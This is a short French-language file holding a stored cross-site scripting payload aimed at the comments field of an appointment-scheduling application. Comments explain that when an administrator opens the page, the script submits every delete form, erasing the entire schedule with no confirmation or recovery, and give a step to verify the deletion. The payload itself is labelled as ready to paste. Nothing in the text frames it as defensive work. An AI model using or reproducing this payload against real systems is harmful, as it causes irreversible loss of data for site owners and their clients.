// ATTAQUE XSS — SUPPRESSION AUTOMATIQUE DE TOUS LES RENDEZ-VOUS
// Champ ciblé : Commentaires
// Effet : dès que l'admin charge la page, tous les boutons "Supprimer" sont cliqués automatiquement
//         l'intégralité du planning est effacée de la base de données sans intervention humaine
// Danger réel : perte totale et irréversible des données — aucune corbeille, aucune confirmation
//               l'admin ne comprend pas pourquoi son planning est vide
// Vérification : recharger la page après enregistrement, observer que tous les RDV ont disparu

// ===== PAYLOAD À COLLER =====
<script>document.querySelectorAll('form button.danger').forEach(function(btn){btn.closest('form').submit();});</script>
